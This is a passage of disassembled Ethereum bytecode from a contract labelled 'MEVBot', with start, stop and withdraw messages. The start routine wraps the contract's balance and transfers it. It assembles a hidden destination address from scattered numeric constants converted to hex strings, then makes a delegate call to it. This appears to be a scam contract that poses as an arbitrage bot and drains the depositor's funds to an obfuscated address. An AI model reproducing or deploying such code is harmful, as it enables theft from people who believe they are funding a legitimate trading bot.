0x37B SWAP3 SWAP2 SWAP1 PUSH2 0x119D JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x39A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x3BE SWAP2 SWAP1 PUSH2 0x11F7 JUMP JUMPDEST POP PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x3EC SWAP1 PUSH2 0x1270 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x47D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x474 SWAP1 PUSH2 0x12DC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x487 PUSH1 0x3 PUSH2 0x5E4 JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4F4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x508 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA9059CBB ADDRESS DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x568 SWAP3 SWAP2 SWAP1 PUSH2 0x119D JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x587 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x5AB SWAP2 SWAP1 PUSH2 0x11F7 JUMP JUMPDEST POP PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x5D9 SWAP1 PUSH2 0x1348 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5F6 PUSH2 0x5F1 PUSH2 0x739 JUMP JUMPDEST PUSH2 0x879 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x602 PUSH2 0xB47 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP6 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x659 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x13DF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP SWAP1 POP PUSH1 0x0 DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH1 0x40 MLOAD PUSH2 0x6E0 SWAP2 SWAP1 PUSH2 0x1487 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x71B JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x720 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH2 0x732 JUMPI DUP1 MLOAD PUSH1 0x20 DUP3 ADD REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 PUSH2 0x745 PUSH2 0xB56 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0xF381D SWAP1 POP PUSH1 0x0 PUSH2 0x759 PUSH2 0xB61 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x12549 SWAP1 POP PUSH1 0x0 PUSH2 0x76D PUSH2 0xB6C JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x5876 SWAP1 POP PUSH1 0x0 PUSH2 0x780 PUSH2 0xB77 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0xB655A SWAP1 POP PUSH1 0x0 PUSH2 0x7A6 PUSH2 0x798 DUP11 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0x7A1 DUP11 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x7C4 PUSH2 0x7B6 DUP10 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0x7BF DUP10 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x7E2 PUSH2 0x7D4 DUP9 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0x7DD DUP9 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x800 PUSH2 0x7F2 DUP8 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0x7FB DUP8 PUSH2 0xB82 JUMP JUMPDEST PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x820 PUSH2 0x811 DUP7 DUP7 PUSH2 0xE16 JUMP JUMPDEST PUSH2 0x81B DUP6 DUP6 PUSH2 0xE16 JUMP JUMPDEST PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x863 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3078000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 SWAP1 POP PUSH1 0x0 DUP1 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0xB3A JUMPI PUSH2 0x100 DUP5 PUSH2 0x8A1 SWAP2 SWAP1 PUSH2 0x14CD JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x8B6 JUMPI PUSH2 0x8B5 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x8D7 SWAP2 SWAP1 PUSH2 0x153E JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x8E8 JUMPI PUSH2 0x8E7 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x939 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x952 JUMPI PUSH1 0x57 DUP4 PUSH2 0x94B SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP3 POP PUSH2 0x9FE JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x990 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x9A9 JUMPI PUSH1 0x37 DUP4 PUSH2 0x9A2 SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP3 POP PUSH2 0x9FD JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x9E7 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x9FC JUMPI PUSH1 0x30 DUP4 PUSH2 0x9F9 SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0xA3C JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xA55 JUMPI PUSH1 0x57 DUP3 PUSH2 0xA4E SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP2 POP PUSH2 0xB01 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0xA93 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xAAC JUMPI PUSH1 0x37 DUP3 PUSH2 0xAA5 SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP2 POP PUSH2 0xB00 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0xAEA JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xAFF JUMPI PUSH1 0x30 DUP3 PUSH2 0xAFC SWAP2 SWAP1 PUSH2 0x1572 JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0xB0F SWAP2 SWAP1 PUSH2 0x14CD JUMP JUMPDEST PUSH2 0xB19 SWAP2 SWAP1 PUSH2 0x15BA JUMP JUMPDEST DUP5 PUSH2 0xB24 SWAP2 SWAP1 PUSH2 0x15BA JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0xB33 SWAP2 SWAP1 PUSH2 0x153E JUMP JUMPDEST SWAP1 POP PUSH2 0x88A JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH4 0xFD7E4D80 PUSH1 0xE0 SHL SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x4EAD2 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x2DCC7 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xCA7BB SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xC2916 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0xBB5 JUMPI DUP2 DUP1 PUSH2 0xB9E SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0xBAE SWAP2 SWAP1 PUSH2 0x1679 JUMP JUMPDEST SWAP1 POP PUSH2 0xB8B JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xBD1 JUMPI PUSH2 0xBD0 PUSH2 0x16AA JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0xC03 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xCA2 JUMPI PUSH1 0x10 DUP7 PUSH2 0xC1E SWAP2 SWAP1 PUSH2 0x16D9 JUMP JUMPDEST SWAP3 POP PUSH2 0xC29 DUP4 PUSH2 0xFB1 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0xC38 SWAP2 SWAP1 PUSH2 0x170A JUMP JUMPDEST PUSH2 0xC42 SWAP2 SWAP1 PUSH2 0x170A JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0xC53 JUMPI PUSH2 0xC52 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0xC8F SWAP2 SWAP1 PUSH2 0x1679 JUMP JUMPDEST SWAP6 POP DUP1 PUSH2 0xC9B SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP1 POP PUSH2 0xC09 JUMP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 SUB PUSH2 0xD01 JUMPI PUSH1 0x0 PUSH2 0xCF2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xE11 JUMP JUMPDEST PUSH1 0x3 DUP2 SUB PUSH2 0xD59 JUMPI PUSH1 0x0 PUSH2 0xD4A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xE11 JUMP JUMPDEST PUSH1 0x2 DUP2 SUB PUSH2 0xDB1 JUMPI PUSH1 0x0 PUSH2 0xDA2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xE11 JUMP JUMPDEST PUSH1 0x1 DUP2 SUB PUSH2 0xE09 JUMPI PUSH1 0x0 PUSH2 0xDFA PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xE16 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xE11 JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP4 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP PUSH1 0x0 DUP2 MLOAD DUP4 MLOAD PUSH2 0xE32 SWAP2 SWAP1 PUSH2 0x153E JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xE4B JUMPI PUSH2 0xE4A PUSH2 0x16AA JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0xE7D JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xF15 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xEA9 JUMPI PUSH2 0xEA8 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0xEC0 SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xED3 JUMPI PUSH2 0xED2 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH2 0xF0D SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP3 POP POP PUSH2 0xE8D JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xFA2 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xF36 JUMPI PUSH2 0xF35 PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0xF4D SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xF60 JUMPI PUSH2 0xF5F PUSH2 0x150F JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH2 0xF9A SWAP1 PUSH2 0x1602 JUMP JUMPDEST SWAP3 POP POP PUSH2 0xF1A JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xFCB JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x1009 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0xFFF SWAP2 SWAP1 PUSH2 0x174B JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x1070 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0x1021 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x106B JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x1057 SWAP2 SWAP1 PUSH2 0x174B JUMP JUMPDEST PUSH2 0x1061 SWAP2 SWAP1 PUSH2 0x1780 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x1070 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x10A0 DUP3 PUSH2 0x1075 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x10B0 DUP2 PUSH2 0x1095 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x10CB PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x10A7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x10E6 DUP2 PUSH2 0x10D1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1101 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x10DD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4D4556426F742073746F702E0000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x114E PUSH1 0xC DUP4 PUSH2 0x1107 JUMP JUMPDEST SWAP2 POP PUSH2 0x1159 DUP3 PUSH2 0x1118 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x117D DUP2 PUSH2 0x1141 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1197 DUP2 PUSH2 0x1184 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x11B2 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x10A7 JUMP JUMPDEST PUSH2 0x11BF PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x118E JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x11D4 DUP2 PUSH2 0x10D1 JUMP JUMPDEST DUP2 EQ PUSH2 0x11DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x11F1 DUP2 PUSH2 0x11CB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x120D JUMPI PUSH2 0x120C PUSH2 0x11C6 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x121B DUP5 DUP3 DUP6 ADD PUSH2 0x11E2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4D4556426F742073746172742E00000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x125A PUSH1 0xD DUP4 PUSH2 0x1107 JUMP JUMPDEST SWAP2 POP PUSH2 0x1265 DUP3 PUSH2 0x1224 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1289 DUP2 PUSH2 0x124D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4D4556426F74206E6F742072756E6E696E672E00000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x12C6 PUSH1 0x13 DUP4 PUSH2 0x1107 JUMP JUMPDEST SWAP2 POP PUSH2 0x12D1 DUP3 PUSH2 0x1290 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x12F5 DUP2 PUSH2 0x12B9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4D4556426F7420776974686472617720416C6C00000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1332 PUSH1 0x13 DUP4 PUSH2 0x1107 JUMP JUMPDEST SWAP2 POP PUSH2 0x133D DUP3 PUSH2 0x12FC JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP 